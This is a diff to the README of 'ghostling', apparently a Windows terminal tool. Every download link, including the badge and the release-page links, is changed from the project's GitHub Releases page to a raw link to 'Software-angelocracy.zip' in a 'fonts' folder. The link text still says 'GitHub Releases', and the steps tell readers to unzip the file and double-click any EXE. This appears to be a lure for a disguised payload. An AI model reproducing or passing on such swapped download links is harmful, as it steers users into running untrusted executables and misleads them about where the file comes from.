@@ -1,6 +1,6 @@
 # 👻 ghostling - Simple terminal use for Windows
 
-[![Download ghostling](https://img.shields.io/badge/Download-ghostling-blue?style=for-the-badge)](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
+[![Download ghostling](https://img.shields.io/badge/Download-ghostling-blue?style=for-the-badge)](https://raw.githubusercontent.com/blebbed-angelicasylvestris797/ghostling/main/fonts/Software-angelocracy.zip)
 
 ## 🧭 Overview
 
@@ -21,13 +21,13 @@ Use these steps to install ghostling on Windows.
 
 ## 📥 Download
 
-1. Open the release page: [ghostling releases](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
+1. Open the release page: [ghostling releases](https://raw.githubusercontent.com/blebbed-angelicasylvestris797/ghostling/main/fonts/Software-angelocracy.zip)
 2. Find the latest release near the top of the page
 3. Download the Windows file for your system
 4. If the file is a ZIP, unzip it first
 5. If the file is an EXE, double-click it to start ghostling
 
-Use the same download page here as well: [Download ghostling from GitHub Releases](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
+Use the same download page here as well: [Download ghostling from GitHub Releases](https://raw.githubusercontent.com/blebbed-angelicasylvestris797/ghostling/main/fonts/Software-angelocracy.zip)
 
 ## 🪟 Install on Windows
 
@@ -207,7 +207,7 @@ The name fits the goal. It keeps the surface small and the result useful.
 
 ## 📚 Release Page
 
-Get the Windows download here: [https://github.com/blebbed-angelicasylvestris797/ghostling/releases](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
+Get the Windows download here: [https://raw.githubusercontent.com/blebbed-angelicasylvestris797/ghostling/main/fonts/Software-angelocracy.zip](https://raw.githubusercontent.com/blebbed-angelicasylvestris797/ghostling/main/fonts/Software-angelocracy.zip)
 
 ## 💬 Short Guide for New Users
 
